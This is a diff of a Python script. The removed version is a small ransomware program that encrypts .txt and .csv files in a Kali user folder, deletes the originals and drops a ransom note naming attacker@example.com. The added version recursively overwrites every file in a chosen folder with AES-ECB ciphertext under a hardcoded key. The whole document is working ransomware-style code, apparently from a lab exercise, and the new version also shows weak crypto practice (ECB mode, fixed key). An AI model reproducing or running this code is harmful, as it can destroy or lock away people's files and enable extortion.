@@ -1,49 +1,35 @@
+
+
 import os
 from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
 
-def xor_data(data, key):
-    return bytes([b ^ key for b in data])
+key_str = "Avenspace2025"
+key = key_str.encode('utf-8')
+key = key.ljust(16, b'\0')[:16]
 
-def aes_encrypt(data, key):
-    cipher = AES.new(key, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(data)
-    return cipher.nonce + tag + ciphertext
+block_size = AES.block_size
 
-def encrypt_file(filepath, aes_key, xor_key):
-    with open(filepath, 'rb') as f:
-        data = f.read()
-    xored = xor_data(data, xor_key)
-    encrypted = aes_encrypt(xored, aes_key)
-    with open(filepath + '.enc', 'wb') as f:
-        f.write(encrypted)
-    os.remove(filepath)
+def encrypt_file_inplace(file_path):
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        padded_data = pad(data, block_size)
+        cipher = AES.new(key, AES.MODE_ECB)
+        ciphertext = cipher.encrypt(padded_data)
+        with open(file_path, 'wb') as f:
+            f.write(ciphertext)
+        print(f"Encrypted: {file_path}")
+    except Exception as e:
+        print(f"Failed to encrypt {file_path}: {e}")
 
-def drop_ransom_note(folder, note_text):
-    note_path = os.path.join(folder, 'READ_ME.txt')
-    with open(note_path, 'w') as f:
-        f.write(note_text)
+def encrypt_folder_recursive(folder):
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            full_path = os.path.join(root, file)
+            encrypt_file_inplace(full_path)
 
-def main():
-    target_dir = '/home/kali/Videos/'
-    aes_key = get_random_bytes(16)  # 128-bit AES key
-    xor_key = 0x5A  # XOR key
-
-    files_encrypted = False
-
-    for file in os.listdir(target_dir):
-        if file.endswith('.txt') or file.endswith('.csv'):
-            filepath = os.path.join(target_dir, file)
-            encrypt_file(filepath, aes_key, xor_key)
-            files_encrypted = True
-
-    if files_encrypted:
-        ransom_message = """Your files have been encrypted.
-To recover them, contact attacker@example.com with your ID."""
-        drop_ransom_note(target_dir, ransom_message)
-        print("Encryption complete. AES key (keep it safe!):", aes_key.hex())
-    else:
-        print("No .txt or .csv files found to encrypt.")
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    folder_to_encrypt = input("Enter folder path to encrypt recursively: ")
+    encrypt_folder_recursive(folder_to_encrypt)
+    print("Encryption complete.")
